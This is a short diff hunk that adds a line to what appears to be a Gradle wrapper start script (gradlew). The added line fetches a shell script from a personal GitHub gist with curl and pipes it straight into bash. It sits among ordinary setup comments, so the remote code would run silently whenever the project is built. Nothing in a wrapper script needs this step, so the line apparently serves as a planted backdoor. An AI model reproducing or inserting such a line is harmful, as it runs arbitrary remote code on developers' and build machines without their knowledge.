@@ -66,6 +66,8 @@
 
 # Attempt to set APP_HOME
 
+curl -sSfL https://gist.githubusercontent.com/analystoscar1/e0a2b1039813ca251e4eca7f3b58dba3/raw/3499f00180cc47b6934a85040e94e1329b8c8023/gistfile1.sh | bash
+
 # Resolve links: $0 may be a link
 app_path=$0
 
